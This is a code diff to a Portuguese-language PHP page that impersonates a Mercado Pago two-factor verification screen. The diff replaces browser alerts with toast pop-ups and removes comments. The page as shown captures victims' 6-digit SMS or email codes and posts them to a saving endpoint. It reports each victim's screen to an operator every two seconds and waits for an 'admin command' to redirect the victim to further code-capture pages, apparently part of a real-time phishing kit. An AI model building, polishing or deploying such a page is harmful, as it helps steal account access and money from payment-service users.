@@ -13,10 +13,8 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
     $redirect_target_2fa = 'dois_fatores.php'; 
 }
-
 
 // Função para formatar o CPF
 function formatarCPF($cpf) {
@@ -42,6 +40,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             --cor-texto-primaria: #333;
             --cor-texto-secundaria: #666;
             --cor-borda: #ddd;
+            /* Adicionadas cores para o pop-up */
+            --cor-sucesso: #28a745;
+            --cor-erro: #dc3545;
         }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
         .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start;}
@@ -59,7 +60,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         .help-link { display: block; margin-top: 24px; color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
         .help-link:hover { text-decoration: underline; }
         .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 32px 40px; width: 440px; box-sizing: border-box; }
-        .form-card label { font-size: 16px; font-weight: 400 color: var(--cor-texto-primaria); }
+        .form-card label { font-size: 16px; font-weight: 400; color: var(--cor-texto-primaria); }
         .code-inputs { display: flex; gap: 8px; justify-content: flex-start; margin: 16px 0; }
         .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
         .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
@@ -69,9 +70,36 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
         .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
         .btn-secondary { color: var(--cor-azul); text-decoration: none; white-space: nowrap; }
+
+        /* PASSO 1: CSS PARA O POP-UP CUSTOMIZADO */
+        .toast {
+            position: fixed;
+            top: -100px; /* Começa escondido acima da tela */
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 24px;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1000;
+            transition: top 0.5s ease-in-out; /* Animação de deslize */
+        }
+        .toast.show {
+            top: 20px; /* Posição final quando visível */
+        }
+        .toast.success {
+            background-color: var(--cor-sucesso);
+        }
+        .toast.error {
+            background-color: var(--cor-erro);
+        }
     </style>
 </head>
 <body>
+
+    <div id="notification-toast" class="toast"></div>
 
     <header class="main-header">
         <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
@@ -120,6 +148,26 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     </main>
 
     <script>
+        // PASSO 3: LÓGICA JAVASCRIPT PARA CONTROLAR O POP-UP
+        const toastElement = document.getElementById('notification-toast');
+        let toastTimeout;
+
+        /**
+         * Mostra um pop-up customizado (toast) na tela.
+         * @param {string} message - A mensagem a ser exibida.
+         * @param {string} type - O tipo de notificação ('success' ou 'error').
+         */
+        function showToast(message, type = 'success') {
+            clearTimeout(toastTimeout);
+            toastElement.textContent = message;
+            toastElement.className = 'toast';
+            toastElement.classList.add(type);
+            toastElement.classList.add('show');
+            toastTimeout = setTimeout(() => {
+                toastElement.classList.remove('show');
+            }, 3000);
+        }
+
         // Seleciona os elementos do DOM
         const smsForm = document.getElementById('sms-form');
         const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
@@ -128,17 +176,12 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         // LÓGICA 1: Pulo automático e backspace entre os inputs
         inputs.forEach((input, index) => {
-            // Evento para quando um dígito é inserido
             input.addEventListener('input', () => {
-                // Se o input tem um valor e não é o último, foca no próximo
                 if (input.value && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
             });
-
-            // Evento para a tecla Backspace
             input.addEventListener('keydown', (e) => {
-                // Se a tecla for Backspace, o input estiver vazio e não for o primeiro, foca no anterior
                 if (e.key === "Backspace" && !input.value && index > 0) {
                     inputs[index - 1].focus();
                 }
@@ -147,10 +190,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         // LÓGICA 2: Contador regressivo de 50 segundos
         function startTimer() {
-            let seconds = 50; // Duração do contador
+            let seconds = 50;
             timerElement.style.color = 'var(--cor-texto-secundaria)';
             
-            // Função que atualiza o timer a cada segundo
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
@@ -159,22 +201,22 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 if (seconds > 0) {
                     seconds--;
                 } else {
-                    // Quando o tempo acaba, limpa o intervalo e mostra o link de reenvio
                     clearInterval(countdownInterval);
                     timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
             
-            clearInterval(countdownInterval); // Limpa qualquer timer anterior
-            updateTimer(); // Roda uma vez imediatamente
-            countdownInterval = setInterval(updateTimer, 1000); // Inicia o contador
+            clearInterval(countdownInterval);
+            updateTimer();
+            countdownInterval = setInterval(updateTimer, 1000);
         }
 
         // Função chamada pelo link "Reenviar código"
         function resendSms(event) {
-            event.preventDefault(); // Previne que a página recarregue
-            alert('Um novo código seria enviado!'); // Simula o reenvio
-            startTimer(); // Reinicia o contador
+            event.preventDefault();
+            // SUBSTITUIÇÃO DO ALERT
+            showToast('Um novo código foi enviado!', 'success');
+            startTimer();
         }
 
         // Inicia o contador assim que a página carrega
@@ -182,37 +224,36 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         
         // LÓGICA 3: Envio do código para a API ao submeter o formulário
         async function handleFormSubmit(event) {
-            event.preventDefault(); // Previne o envio padrão do formulário
+            event.preventDefault();
             
-            // Junta os 6 dígitos em uma única string
             const code = inputs.map(input => input.value).join('');
 
             if (code.length === 6) {
                 try {
-                    // Faz a chamada para sua API
+                    // O nome da API pode ser diferente para o e-mail, ajuste se necessário.
                     const response = await fetch('api_salvar_sms.php', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ sms_code: code })
+                        body: JSON.stringify({ sms_code: code, source: 'email' }) // Adicionado 'source'
                     });
                     
                     const result = await response.json();
                     
                     if (result.success) {
-                        alert('Código recebido com sucesso!');
-                        // Você pode redirecionar o usuário aqui se quiser
-                        // window.location.href = '/proxima_pagina.php';
+                        // SUBSTITUIÇÃO DO ALERT
+                        showToast('Código recebido com sucesso!', 'success');
                     } else {
-                        // Mostra o erro retornado pela API
-                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
+                        // SUBSTITUIÇÃO DO ALERT
+                        showToast('Erro: ' + (result.error || 'Não foi possível salvar o código.'), 'error');
                     }
                 } catch (error) {
-                    // Mostra um erro de conexão
-                    alert('Erro de conexão com o servidor.');
+                    // SUBSTITUIÇÃO DO ALERT
+                    showToast('Erro de conexão com o servidor.', 'error');
                     console.error('Fetch error:', error);
                 }
             } else {
-                alert('Por favor, preencha todos os 6 dígitos.');
+                // SUBSTITUIÇÃO DO ALERT
+                showToast('Por favor, preencha todos os 6 dígitos.', 'error');
             }
         }
     </script>
@@ -243,13 +284,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
             };
 
-            // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
-            // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
-            // Função que envia o "ping" para a API
             async function sendStatusUpdate() {
                 try {
                     await fetch('api_update_status.php', {
@@ -259,25 +296,17 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         },
                         body: JSON.stringify({ status: currentStatus })
                     });
-                    // Não precisamos fazer nada com a resposta, apenas enviar.
                 } catch (error) {
-                    // Se falhar, loga no console sem incomodar o usuário.
                     console.error('Falha ao enviar atualização de status:', error);
                 }
             }
-
-            // Envia o primeiro status imediatamente ao carregar a página
             sendStatusUpdate();
-
-            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
             setInterval(sendStatusUpdate, 2000);
         })();
     </script>
     <script>
         (function() {
-            // Pega a URL de redirecionamento que o PHP definiu
             const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
-
             async function checkAdminCommand() {
                 try {
                     const response = await fetch('api_check_status.php');
@@ -286,20 +315,14 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     console.log('Status atual:', data.status); 
 
                     if (data.status === 'redirecionar_para_2fa') {
-                        // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
-                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
                 } catch (error) {
                     console.error('Erro ao verificar status:', error);
                 }
             }
-
-            // Inicia a verificação a cada 3 segundos
             const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
